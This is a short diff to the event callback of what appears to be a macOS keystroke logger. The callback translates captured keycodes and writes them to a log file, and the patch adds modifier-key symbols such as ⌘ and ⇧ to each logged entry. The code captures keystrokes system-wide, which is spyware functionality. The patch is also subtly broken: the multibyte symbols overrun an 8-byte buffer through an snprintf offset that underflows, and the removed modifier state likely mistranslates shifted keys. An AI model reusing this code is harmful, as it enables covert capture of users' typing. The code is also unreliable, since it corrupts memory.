@@ -22,10 +22,13 @@ CGEventRef event_callback(
     UniChar chars[4];
     UniCharCount actualLength;
     UInt32 modifierKeyState = 0;
-    if (flags & kCGEventFlagMaskShift)      modifierKeyState |= shiftKey;
-    if (flags & kCGEventFlagMaskAlphaShift) modifierKeyState |= alphaLock;
-    if (flags & kCGEventFlagMaskControl)    modifierKeyState |= controlKey;
-    if (flags & kCGEventFlagMaskAlternate)  modifierKeyState |= optionKey;
+    char prefix[8] = {0};
+    int offset = 0;
+    if (flags & kCGEventFlagMaskCommand)    offset += snprintf(prefix + offset, sizeof(prefix) - offset, "⌘");
+    if (flags & kCGEventFlagMaskControl)    offset += snprintf(prefix + offset, sizeof(prefix) - offset, "⌃");
+    if (flags & kCGEventFlagMaskAlternate)  offset += snprintf(prefix + offset, sizeof(prefix) - offset, "⌥");
+    if (flags & kCGEventFlagMaskShift)      offset += snprintf(prefix + offset, sizeof(prefix) - offset, "⇧");
+    if (flags & kCGEventFlagMaskAlphaShift) offset += snprintf(prefix + offset, sizeof(prefix) - offset, "⇪");
     OSStatus status = UCKeyTranslate(
         keyboardLayout,
         keycode,
@@ -39,9 +42,9 @@ CGEventRef event_callback(
         chars
     );
     if (status == noErr && actualLength > 0) {
+        fprintf(log_file, "%s", prefix);  // Print ⌘⇧ etc.
         for (int i = 0; i < actualLength; i++) {
             uint16_t ch = chars[i];
-
             if (ch < 0x80) {
                 fputc(ch, log_file);
             } else if (ch < 0x800) {
